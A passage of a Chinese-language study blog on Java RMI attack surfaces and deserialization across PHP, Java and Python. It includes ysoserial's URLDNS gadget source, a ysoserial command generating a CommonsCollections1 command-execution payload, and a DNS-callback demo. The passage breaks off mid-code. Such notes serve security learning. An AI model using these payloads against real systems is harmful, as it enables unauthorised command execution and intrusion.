本地使⽤⼀样了。</p>\n<p>虽说执⾏远程⽅法的时候代码是在远程服务器上执⾏的，但实际上我们还是需要知道有哪些⽅法，这时 候接⼝的重要性就体现了，这也是为什么我们前⾯要继承 Remote 并将我们需要调⽤的⽅法写在接⼝ IRemoteHelloWorld ⾥，因为客户端也需要⽤到这个接⼝。</p>\n<p>流程：</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/realikun404/p1cg0_u4e/PicGo/image-20230321185000707.png\" alt=\"image-20230321185000707\"></p>\n<p>RMI Registry就像⼀个⽹关，他⾃⼰是不会执⾏远程⽅法的，但RMI Server可以在上⾯注册⼀个Name 到对象的绑定关系；RMI Client通过Name向RMI Registry查询，得到这个绑定关系，然后再连接RMI Server；最后，远程⽅法实际上在RMI Server上调⽤。</p>\n<p><strong>利用codebase攻击RMI Registry。</strong><del>这部分云了</del></p>\n<p><a href=\"https://wx.zsxq.com/dweb2/index/columns/2212251881\">知识星球 | 深度连接铁杆粉丝，运营高品质社群，知识变现的工具 (zsxq.com)</a></p>\n<p>一个RMI过程有以下三个参与者： RMI Registry 、RMI Server、 RMI Client</p>\n<p>通常我们在新建一个RMI Registry的时候，都会 直接绑定一个对象在上面，也就是说我们示例代码中的Server其实包含了Registry和Server两部分：</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\">LocateRegistry.createRegistry(<span class=\"number\">1099</span>);</span><br><span class=\"line\">Naming.bind(<span class=\"string\">&quot;rmi://127.0.0.1:1099/Hello&quot;</span>, <span class=\"keyword\">new</span> <span class=\"title class_\">RemoteHelloWorld</span>());</span><br></pre></td></tr></table></figure>\n\n<p>第一行创建并运行RMI Registry，第二行将RemoteHelloWorld对象绑定到Hello这个名字上。 Naming.bind 的第一个参数是一个URL，形如： rmi:&#x2F;&#x2F;host:port&#x2F;name 。</p>\n<p>其中，host和port就是 RMI Registry的地址和端口，name是远程对象的名字。</p>\n<p> 如果RMI Registry在本地运行，那么host和port是可以省略的，此时host默认是 localhost ，port默认 是 1099 ：</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\">Naming.bind(<span class=\"string\">&quot;Hello&quot;</span>, <span class=\"keyword\">new</span> <span class=\"title class_\">RemoteHelloWorld</span>());</span><br></pre></td></tr></table></figure>\n\n<p>以上就是RMI整个的原理与流程。接下来，我们很自然地想到，RMI会给我们带来哪些安全问题？ 从两个方向思考一下这个问题： </p>\n<ol>\n<li>如果我们能访问RMI Registry服务，如何对其攻击？ </li>\n<li>如果我们控制了目标RMI客户端中 Naming.lookup 的第一个参数（也就是RMI Registry的地 址），能不能进行攻击？</li>\n</ol>\n<p>如何攻击RMI Registry？</p>\n<p>MI Registry是一个远程对象管理的地方，可以理解为一个远程对象的“后台”。我们可以尝试直 接访问“后台”功能，比如修改远程服务器上Hello对应的对象：</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">RemoteHelloWorld</span> <span class=\"variable\">h</span> <span class=\"operator\">=</span> <span class=\"keyword\">new</span> <span class=\"title class_\">RemoteHelloWorld</span>();</span><br><span class=\"line\">Naming.rebind(<span class=\"string\">&quot;rmi://192.168.135.142:1099/Hello&quot;</span>, h);</span><br></pre></td></tr></table></figure>\n\n<p>但是这样会报错，因为Java对远程访问RMI Registry做了限制，只有来源地址是localhost的时候，才能调用rebind、 bind、unbind等方法。</p>\n<p>不过list和lookup方法可以远程调用。 list方法可以列出目标上所有绑定的对象：</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\">String[] s = Naming.list(<span class=\"string\">&quot;rmi://192.168.135.142:1099&quot;</span>);</span><br></pre></td></tr></table></figure>\n\n<p>lookup作用就是获得某个远程对象。 那么，只要目标服务器上存在一些危险方法，我们通过RMI就可以对其进行调用。</p>\n<p>classAnnotations是什么？</p>\n<p>众所周知，在序列化Java类的时候用到了一个类，叫 ObjectOutputStream 。这个类内部有一个方法 annotateClass ， ObjectOutputStream 的子类有需要向序列化后的数据里放任何内容，都可以重写 这个方法，写入你自己想要写入的数据。然后反序列化时，就可以读取到这个信息并使用。</p>\n<p>所以，我们在分析序列化数据时看到的 classAnnotations ，实际上就是 annotateClass 方法写入的 内容。</p>\n<h2 id=\"反序列化\"><a href=\"#反序列化\" class=\"headerlink\" title=\"反序列化\"></a>反序列化</h2><h3 id=\"不同语言的反序列化\"><a href=\"#不同语言的反序列化\" class=\"headerlink\" title=\"不同语言的反序列化\"></a>不同语言的反序列化</h3><p>为什么反序列化常常会带来安全隐患？</p>\n<p> 一门成熟的语言，如果需要在网络上传递信息，通常会用到一些格式化数据，比如： JSON XML JSON和XML是通用数据交互格式，通常用于不同语言、不同环境下数据的交互，比如前端的JavaScript 通过JSON和后端服务通信、微信服务器通过XML和公众号服务器通信。</p>\n<p>但这两个数据格式都有一个共 同的问题：不支持复杂的数据类型。 </p>\n<p>大多数处理方法中，JSON和XML支持的数据类型就是基本数据类型，整型、浮点型、字符串、布尔 等，如果开发者希望在传输数据的时候直接传输一个对象，那么就不得不想办法扩展基础的 JSON（XML）语法。</p>\n<p> 比如，Jackson和Fastjson这类序列化库，在JSON（XML）的基础上进行改造，通过特定的语法来传递 对象；亦或者如RMI，直接使用Java等语言内置的序列化方法，将一个对象转换成一串二进制数据进行 传输。 </p>\n<p>不管是Jackson、Fastjson还是编程语言内置的序列化方法，一旦涉及到序列化与反序列化数据，就可 能会涉及到安全问题。</p>\n<p>但首先要理解的是，“反序列化漏洞”是对一类漏洞的泛指，而不是专指某种反序 列化方法导致的漏洞，比如Jackson反序列化漏洞和Java readObject造成的反序列化漏洞就是完全不同 的两种漏洞。</p>\n<h4 id=\"反序列化方法的对比\"><a href=\"#反序列化方法的对比\" class=\"headerlink\" title=\"反序列化方法的对比\"></a>反序列化方法的对比</h4><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">Java的反序列化和PHP的反序列化其实有点类似，他们都只能将一个对象中的属性按照某种特定的格式生成一段数据流，在反序列化的时候再按照这个格式将属性拿回来，再赋值给新的对象。</span><br><span class=\"line\"></span><br><span class=\"line\">但Java相对PHP序列化更深入的地方在于，其提供了更加高级、灵活地方法 writeObject ，允许开发者 在序列化流中插入一些自定义数据，进而在反序列化的时候能够使用 readObject 进行读取。</span><br><span class=\"line\"></span><br><span class=\"line\">当然，PHP中也提供了一个魔术方法叫 __wakeup ，在反序列化的时候进行触发。很多人会认为Java的 readObject 和PHP的 __wakeup 类似，但其实不全对，虽然都是在反序列化的时候触发，但他们解决 的问题稍微有些差异。 </span><br><span class=\"line\"></span><br><span class=\"line\">java设计 readObject 的思路和PHP的 __wakeup 不同点在于： </span><br><span class=\"line\">readObject 倾向于解决“反序列化时如何还原一个完整对象”这个问题，而PHP的 __wakeup 更倾向于解决“反序列化后如何初始化这个对象”的问题。 </span><br><span class=\"line\">但这个设计理念可以说是决定为什么Java的反序列化漏洞这么多的根本原因。</span><br></pre></td></tr></table></figure>\n\n<h4 id=\"PHP反序列化\"><a href=\"#PHP反序列化\" class=\"headerlink\" title=\"PHP反序列化\"></a>PHP反序列化</h4><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">PHP的序列化是开发者不能参与的，开发者调用 serialize 函数后，序列化的数据就已经完成了，你得到的是一个完整的对象，你并不能在序列化数据流里新增某一个内容，你如果想插入新的内容，只有将其保存在一个属性中。也就是说PHP的序列化、反序列化是一个纯内部的过程，而其 __sleep 、__wakeup 魔术方法的目的就是在序列化、反序列化的前后执行一些操作。</span><br></pre></td></tr></table></figure>\n\n<p>一个非常典型的PHP序列化例子，就是含有资源类型的PHP类，如数据库连接：</p>\n<figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">Connection</span></span></span><br><span class=\"line\"><span class=\"class\"></span>&#123;</span><br><span class=\"line\"><span class=\"keyword\">protected</span> <span class=\"variable\">$link</span>;</span><br><span class=\"line\"><span class=\"keyword\">private</span> <span class=\"variable\">$dsn</span>, <span class=\"variable\">$username</span>, <span class=\"variable\">$password</span>;</span><br><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__construct</span>(<span class=\"params\"><span class=\"variable\">$dsn</span>, <span class=\"variable\">$username</span>, <span class=\"variable\">$password</span></span>)</span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\"><span class=\"variable language_\">$this</span>-&gt;dsn = <span class=\"variable\">$dsn</span>;</span><br><span class=\"line\"><span class=\"variable language_\">$this</span>-&gt;username = <span class=\"variable\">$username</span>;</span><br><span class=\"line\"><span class=\"variable language_\">$this</span>-&gt;password = <span class=\"variable\">$password</span>;</span><br><span class=\"line\"><span class=\"variable language_\">$this</span>-&gt;<span class=\"title function_ invoke__\">connect</span>();</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"keyword\">private</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">connect</span>(<span class=\"params\"></span>)</span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\"><span class=\"variable language_\">$this</span>-&gt;link = <span class=\"keyword\">new</span> <span class=\"title function_ invoke__\">PDO</span>(<span class=\"variable\">$this</span>-&gt;dsn, <span class=\"variable\">$this</span>-&gt;username, <span class=\"variable\">$this</span>-</span><br><span class=\"line\">&gt;password);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>PHP中，资源类型的对象默认是不会写入序列化数据中的。那么上述Connection类的 $link 属性在序 列化后就是null，反序列化时拿到的也是null。 那么，如果我想要反序列化时拿到的 $link 就是一个数据库连接，我就需要编写 __wakeup 方法：</p>\n<figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">Connection</span></span></span><br><span class=\"line\"><span class=\"class\"></span>&#123;</span><br><span class=\"line\"><span class=\"keyword\">protected</span> <span class=\"variable\">$link</span>;</span><br><span class=\"line\"><span class=\"keyword\">private</span> <span class=\"variable\">$dsn</span>, <span class=\"variable\">$username</span>, <span class=\"variable\">$password</span>;</span><br><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__construct</span>(<span class=\"params\"><span class=\"variable\">$dsn</span>, <span class=\"variable\">$username</span>, <span class=\"variable\">$password</span></span>)</span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\"><span class=\"variable language_\">$this</span>-&gt;dsn = <span class=\"variable\">$dsn</span>;</span><br><span class=\"line\"><span class=\"variable language_\">$this</span>-&gt;username = <span class=\"variable\">$username</span>;</span><br><span class=\"line\"><span class=\"variable language_\">$this</span>-&gt;password = <span class=\"variable\">$password</span>;</span><br><span class=\"line\"><span class=\"variable language_\">$this</span>-&gt;<span class=\"title function_ invoke__\">connect</span>();</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"keyword\">private</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">connect</span>(<span class=\"params\"></span>)</span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\"><span class=\"variable language_\">$this</span>-&gt;link = <span class=\"keyword\">new</span> <span class=\"title function_ invoke__\">PDO</span>(<span class=\"variable\">$this</span>-&gt;dsn, <span class=\"variable\">$this</span>-&gt;username, <span class=\"variable\">$this</span>-</span><br><span class=\"line\">&gt;password);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__sleep</span>(<span class=\"params\"></span>)</span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\"><span class=\"keyword\">return</span> <span class=\"keyword\">array</span>(<span class=\"string\">&#x27;dsn&#x27;</span>, <span class=\"string\">&#x27;username&#x27;</span>, <span class=\"string\">&#x27;password&#x27;</span>);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__wakeup</span>(<span class=\"params\"></span>)</span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\"><span class=\"variable language_\">$this</span>-&gt;<span class=\"title function_ invoke__\">connect</span>();</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<h4 id=\"Java反序列化\"><a href=\"#Java反序列化\" class=\"headerlink\" title=\"Java反序列化\"></a>Java反序列化</h4><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">java反序列化的操作，很多是需要开发者深入参与的，所以你会发现大量的库会实现 readObject 、writeObject 方法，这和PHP中 __wakeup 、 __sleep 很少使用是存在鲜明对比的。</span><br><span class=\"line\">这次再来说说objectAnnotation。</span><br></pre></td></tr></table></figure>\n\n<p>Java在序列化时一个对象，将会调用这个对象中的 writeObject 方法，参数类型是ObjectOutputStream ，开发者可以将任何内容写入这个stream中；反序列化时，会调用 readObject ，开发者也可以从中读取出前面写入的内容，并进行处理。</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">package</span> org.vulhub.Ser;</span><br><span class=\"line\"><span class=\"keyword\">import</span> java.io.IOException;</span><br><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"keyword\">class</span> <span class=\"title class_\">Person</span> <span class=\"keyword\">implements</span> <span class=\"title class_\">java</span>.io.Serializable &#123;</span><br><span class=\"line\"><span class=\"keyword\">public</span> String name;</span><br><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"type\">int</span> age;</span><br><span class=\"line\">Person(String name, <span class=\"type\">int</span> age) &#123;</span><br><span class=\"line\"><span class=\"built_in\">this</span>.name = name;</span><br><span class=\"line\"><span class=\"built_in\">this</span>.age = age;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"keyword\">private</span> <span class=\"keyword\">void</span> <span class=\"title function_\">writeObject</span><span class=\"params\">(java.io.ObjectOutputStream s)</span> <span class=\"keyword\">throws</span></span><br><span class=\"line\">IOException &#123;</span><br><span class=\"line\">s.defaultWriteObject();</span><br><span class=\"line\">s.writeObject(<span class=\"string\">&quot;This is a object&quot;</span>);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"keyword\">private</span> <span class=\"keyword\">void</span> <span class=\"title function_\">readObject</span><span class=\"params\">(java.io.ObjectInputStream s)</span></span><br><span class=\"line\"><span class=\"keyword\">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class=\"line\">s.defaultReadObject();</span><br><span class=\"line\"><span class=\"type\">String</span> <span class=\"variable\">message</span> <span class=\"operator\">=</span> (String) s.readObject();</span><br><span class=\"line\">System.out.println(message);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>这里在执行完默认的 s.defaultWriteObject() 后，向stream里写入了一个字符串 This is a object 。</p>\n<p>我们写入的字符串 This is a object 被放在 objectAnnotation 的位置。</p>\n<p>在反序列化时，读取了这个字符串，并将其输出。</p>\n<h4 id=\"Python反序列化\"><a href=\"#Python反序列化\" class=\"headerlink\" title=\"Python反序列化\"></a>Python反序列化</h4><p>Python反序列化和Java、PHP有个显著的区别，就是Python的反序列化过程实际上是在执行一个基于 栈的虚拟机。我们可以向栈上增、删对象，也可以执行一些指令，比如函数的执行等，甚至可以用这个虚拟机执行一个完整的应用程序。 所以，Python的反序列化可以立即导致任意函数、命令执行漏洞，与需要gadget的PHP和Java相比更加 危险。</p>\n<h4 id=\"总结\"><a href=\"#总结\" class=\"headerlink\" title=\"总结\"></a>总结</h4><p>总结一下，从危害上来看，Python的反序列化危害是最大的；从应用广度上来看，Java的反序列化是最 常被用到的；从反序列化的原理上来看，PHP和Java是类似又不尽相同的。</p>\n<h3 id=\"URLDNS-最简单的Gadget\"><a href=\"#URLDNS-最简单的Gadget\" class=\"headerlink\" title=\"URLDNS-最简单的Gadget\"></a>URLDNS-最简单的Gadget</h3><p>说在前面：</p>\n<p><strong>ysoserial</strong>：可以让⽤户根据⾃⼰选择的利⽤链，⽣成反 序列化利⽤数据，通过将这些数据发送给⽬标，从⽽执⾏⽤户预先定义的命令。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">利⽤链也叫“gadget chains”，我们通常称为gadget。如果你学过PHP反序列化漏洞，那么就可以将gadget理解为⼀种⽅法，它连接的是从触发位置开始到执⾏命令的位置结束，在PHP⾥可能</span><br><span class=\"line\">是 __desctruct 到 eval ；如果你没学过其他语⾔的反序列化漏洞，那么gadget就是⼀种⽣成POC的⽅法罢了。</span><br></pre></td></tr></table></figure>\n\n<p>ysoserial的使⽤也很简单，虽然我们暂时先不理解 CommonsCollections ，但是⽤ysoserial可以很容 易地⽣成这个gadget对应的POC：</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"code\"><pre><span class=\"line\">java -jar ysoserial-master-30099844c6-1.jar CommonsCollections1 &quot;id&quot;</span><br></pre></td></tr></table></figure>\n\n<p>如上，ysoserial⼤部分的gadget的参数就是⼀条命令，⽐如这⾥是 id 。⽣成好的POC发送给⽬标，如 果⽬标存在反序列化漏洞，并满⾜这个gadget对应的条件，则命令 id 将被执⾏。</p>\n<p>URLDNS 就是ysoserial中⼀个利⽤链的名字，但准确来说，这个其实不能称作“利⽤链”。因为其参数不 是⼀个可以“利⽤”的命令，⽽仅为⼀个URL，其能触发的结果也不是命令执⾏，⽽是⼀次DNS请求。 虽然这个“利⽤链”实际上是不能“利⽤”的，但因为其如下的优点，⾮常适合我们在检测反序列化漏洞时 使⽤： 使⽤Java内置的类构造，对第三⽅库没有依赖 在⽬标没有回显的时候，能够通过DNS请求得知是否存在反序列化漏洞.</p>\n<p>可以在<a href=\"https://github.com/frohoff/ysoserial/blob/master/src/main/java/ysoserial/payloads/URLDNS.java\">ysoserial&#x2F;URLDNS.java at master · frohoff&#x2F;ysoserial (github.com)</a></p>\n<p>看到下面的生成代码</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">package</span> ysoserial.payloads;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">import</span> java.io.IOException;</span><br><span class=\"line\"><span class=\"keyword\">import</span> java.net.InetAddress;</span><br><span class=\"line\"><span class=\"keyword\">import</span> java.net.URLConnection;</span><br><span class=\"line\"><span class=\"keyword\">import</span> java.net.URLStreamHandler;</span><br><span class=\"line\"><span class=\"keyword\">import</span> java.util.HashMap;</span><br><span class=\"line\"><span class=\"keyword\">import</span> java.net.URL;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">import</span> ysoserial.payloads.annotation.Authors;</span><br><span class=\"line\"><span class=\"keyword\">import</span> ysoserial.payloads.annotation.Dependencies;</span><br><span class=\"line\"><span class=\"keyword\">import</span> ysoserial.payloads.annotation.PayloadTest;</span><br><span class=\"line\"><span class=\"keyword\">import</span> ysoserial.payloads.util.PayloadRunner;</span><br><span class=\"line\"><span class=\"keyword\">import</span> ysoserial.payloads.util.Reflections;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">/**</span></span><br><span class=\"line\"><span class=\"comment\"> * A blog post with more details about this gadget chain is at the url below:</span></span><br><span class=\"line\"><span class=\"comment\"> *   https://blog.paranoidsoftware.com/triggering-a-dns-lookup-using-java-deserialization/</span></span><br><span class=\"line\"><span class=\"comment\"> *</span></span><br><span class=\"line\"><span class=\"comment\"> *   This was inspired by  Philippe Arteau <span class=\"doctag\">@h</span>3xstream, who wrote a blog</span></span><br><span class=\"line\"><span class=\"comment\"> *   posting describing how he modified the Java Commons Collections gadget</span></span><br><span class=\"line\"><span class=\"comment\"> *   in ysoserial to open a URL. This takes the same idea, but eliminates</span></span><br><span class=\"line\"><span class=\"comment\"> *   the dependency on Commons Collections and does a DNS lookup with just</span></span><br><span class=\"line\"><span class=\"comment\"> *   standard JDK classes.</span></span><br><span class=\"line\"><span class=\"comment\"> *</span></span><br><span class=\"line\"><span class=\"comment\"> *   The Java URL class has an interesting property on its equals and</span></span><br><span class=\"line\"><span class=\"comment\"> *   hashCode methods. The URL class will, as a side effect, do a DNS lookup</span></span><br><span class=\"line\"><span class=\"comment\"> *   during a comparison (either equals or hashCode).</span></span><br><span class=\"line\"><span class=\"comment\"> *</span></span><br><span class=\"line\"><span class=\"comment\"> *   As part of deserialization, HashMap calls hashCode on each key that it</span></span><br><span class=\"line\"><span class=\"comment\"> *   deserializes, so using a Java URL object as a serialized key allows</span></span><br><span class=\"line\"><span class=\"comment\"> *   it to trigger a DNS lookup.</span></span><br><span class=\"line\"><span class=\"comment\"> *</span></span><br><span class=\"line\"><span class=\"comment\"> *   Gadget Chain:</span></span><br><span class=\"line\"><span class=\"comment\"> *     HashMap.readObject()</span></span><br><span class=\"line\"><span class=\"comment\"> *       HashMap.putVal()</span></span><br><span class=\"line\"><span class=\"comment\"> *         HashMap.hash()</span></span><br><span class=\"line\"><span class=\"comment\"> *           URL.hashCode()</span></span><br><span class=\"line\"><span class=\"comment\"> *</span></span><br><span class=\"line\"><span class=\"comment\"> *</span></span><br><span class=\"line\"><span class=\"comment\"> */</span></span><br><span class=\"line\"><span class=\"meta\">@SuppressWarnings(&#123; &quot;rawtypes&quot;, &quot;unchecked&quot; &#125;)</span></span><br><span class=\"line\"><span class=\"meta\">@PayloadTest(skip = &quot;true&quot;)</span></span><br><span class=\"line\"><span class=\"meta\">@Dependencies()</span></span><br><span class=\"line\"><span class=\"meta\">@Authors(&#123; Authors.GEBL &#125;)</span></span><br><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"keyword\">class</span> <span class=\"title class_\">URLDNS</span> <span class=\"keyword\">implements</span> <span class=\"title class_\">ObjectPayload</span>&lt;Object&gt; &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">public</span> Object <span class=\"title function_\">getObject</span><span class=\"params\">(<span class=\"keyword\">final</span> String url)</span> <span class=\"keyword\">throws</span> Exception &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">                <span class=\"comment\">//Avoid DNS resolution during payload creation</span></span><br><span class=\"line\">                <span class=\"comment\">//Since the field &lt;code&gt;java.net.URL.handler&lt;/code&gt; is transient, it will not be part of the serialized payload.</span></span><br><span class=\"line\">                <span class=\"type\">URLStreamHandler</span> <span class=\"variable\">handler</span> <span class=\"operator\">=</span> <span class=\"keyword\">new</span> <span class=\"title class_\">SilentURLStreamHandler</span>();</span><br><span class=\"line\"></span><br><span class=\"line\">                <span class=\"type\">HashMap</span> <span class=\"variable\">ht</span> <span class=\"operator\">=</span> <span class=\"keyword\">new</span> <span class=\"title class_\">HashMap</span>(); <span class=\"comment\">// HashMap that will contain the URL</span></span><br><span class=\"line\">                <span class=\"type\">URL</span> <span class=\"variable\">u</span> <span class=\"operator\">=</span> <span class=\"keyword\">new</span> <span class=\"title class_\">URL</span>(<span class=\"literal\">null</span>, url, handler); <span class=\"comment\">// URL to use as the Key</span></span><br><span class=\"line\">                ht.put(u, url); <span class=\"comment\">//The value can be anything that is Serializable, URL as the key is what triggers the DNS lookup.</span></span><br><span class=\"line\"></span><br><span class=\"line\">                Reflections.setFieldValue(u, <span class=\"string\">&quot;hashCode&quot;</span>, -<span class=\"number\">1</span>); <span class=\"comment\">// During the put above, the URL&#x27;s hashCode is calculated and cached. This resets that so the next time hashCode is called a DNS lookup will be triggered.</span></span><br><span class=\"line\"></span><br><span class=\"line\">                <span class=\"keyword\">return</span> ht;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title function_\">main</span><span class=\"params\">(<span class=\"keyword\">final</span> String[] args)</span> <span class=\"keyword\">throws</span> Exception &#123;</span><br><span class=\"line\">                PayloadRunner.run(URLDNS.class, args);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"comment\">/**</span></span><br><span class=\"line\"><span class=\"comment\">         * &lt;p&gt;This instance of URLStreamHandler is used to avoid any DNS resolution while creating the URL instance.</span></span><br><span class=\"line\"><span class=\"comment\">         * DNS resolution is used for vulnerability detection. It is important not to probe the given URL prior</span></span><br><span class=\"line\"><span class=\"comment\">         * using the serialized object.&lt;/p&gt;</span></span><br><span class=\"line\"><span class=\"comment\">         *</span></span><br><span class=\"line\"><span class=\"comment\">         * &lt;b&gt;Potential false negative:&lt;/b&gt;</span></span><br><span class=\"line\"><span class=\"comment\">         * &lt;p&gt;If the DNS name is resolved first from the tester computer, the targeted server might get a cache hit on the</span></span><br><span class=\"line\"><span class=\"comment\">         * second resolution.&lt;/p&gt;</span></span><br><span class=\"line\"><span class=\"comment\">         */</span></span><br><span class=\"line\">        <span class=\"keyword\">static</span> <span class=\"keyword\">class</span> <span class=\"title class_\">SilentURLStreamHandler</span> <span class=\"keyword\">extends</span> <span class=\"title class_\">URLStreamHandler</span> &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">                <span class=\"keyword\">protected</span> URLConnection <span class=\"title function_\">openConnection</span><span class=\"params\">(URL u)</span> <span class=\"keyword\">throws</span> IOException &#123;</span><br><span class=\"line\">                        <span class=\"keyword\">return</span> <span class=\"literal\">null</span>;</span><br><span class=\"line\">                &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">                <span class=\"keyword\">protected</span> <span class=\"keyword\">synchronized</span> InetAddress <span class=\"title function_\">getHostAddress</span><span class=\"params\">(URL u)</span> &#123;</span><br><span class=\"line\">                        <span class=\"keyword\">return</span> <span class=\"literal\">null</span>;</span><br><span class=\"line\">                &#125;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>跟着ysoserial项目中URLDNS的Gadget来分析</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\">Gadget Chain:</span><br><span class=\"line\">    HashMap.readObject()</span><br><span class=\"line\">    HashMap.putVal()</span><br><span class=\"line\">    HashMap.hash()</span><br><span class=\"line\">    URL.hashCode()</span><br></pre></td></tr></table></figure>\n\n<p>下面是一个demo</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">package</span> org.example;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">import</span> java.net.URL;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"keyword\">class</span> <span class=\"title class_\">Main</span> &#123;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title function_\">main</span><span class=\"params\">(String[] args)</span> <span class=\"keyword\">throws</span> Exception &#123;</span><br><span class=\"line\">        <span class=\"type\">URL</span> <span class=\"variable\">url</span> <span class=\"operator\">=</span> <span class=\"keyword\">new</span> <span class=\"title class_\">URL</span>(<span class=\"string\">&quot;http://cc.tb9xxc.dnslog.cn&quot;</span>);</span><br><span class=\"line\">        url.hashCode();</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"https://cdn.jsdelivr.net/gh/realikun404/p1cg0_u4e/PicGo/image-20230322154213647.png\" alt=\"image-20230322154213647\"></p>\n<p>可以看到成功执行了。</p>\n<p>不知道为什么我在本地jdk11的代码运行不了完整的demo，但在云上jdk11可以执行，–illegal-access&#x3D;warn（添加的VM选项）。</p>\n<p>先跟进<code>HashMap</code>，看看其自己实现的<code>readObject()</code>函数，这里通过<code>for</code>循环来将<code>HashMap</code>中存储的<code>key</code>通过<code>K key = (K) s.readObject();</code>来进行反序列化，在这之后调用<code>putVal()</code>和<code>hash()</code>函数。</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">private</span> <span class=\"keyword\">void</span> <span class=\"title function_\">readObject</span><span class=\"params\">(ObjectInputStream s)</span></span><br><span class=\"line\">       <span class=\"keyword\">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class=\"line\">       reinitialize();</span><br><span class=\"line\"></span><br><span class=\"line\">       ObjectInputStream.<span class=\"type\">GetField</span> <span class=\"variable\">fields</span> <span class=\"operator\">=</span> s.readFields();</span><br><span class=\"line\"></span><br><span class=\"line\">       <span class=\"comment\">// Read loadFactor (ignore threshold)</span></span><br><span class=\"line\">       <span class=\"type\">float</span> <span class=\"variable\">lf</span> <span class=\"operator\">=</span> fields.get(<span class=\"string\">&quot;loadFactor&quot;</span>, <span class=\"number\">0.75f</span>);</span><br><span class=\"line\">       <span class=\"keyword\">if</span> (lf &lt;= <span class=\"number\">0</span> || Float.isNaN(lf))</span><br><span class=\"line\">           <span class=\"keyword\">throw</span> <span class=\"keyword\">new</span> <span class=\"title class_\">InvalidObjectException</span>(<span class=\"string\">&quot;Illegal load factor: &quot;</span> + lf);</span><br><span class=\"line\"></span><br><span class=\"line\">       lf = Math.min(Math.max(<span class=\"number\">0.25f</span>, lf), <span class=\"number\">4.0f</span>);</span><br><span class=\"line\">       HashMap.UnsafeHolder.putLoadFactor(<span class=\"built_in\">this</span>, lf);</span><br><span class=\"line\"></span><br><span class=\"line\">       s.readInt();                <span class=\"comment\">// Read and ignore number of buckets</span></span><br><span 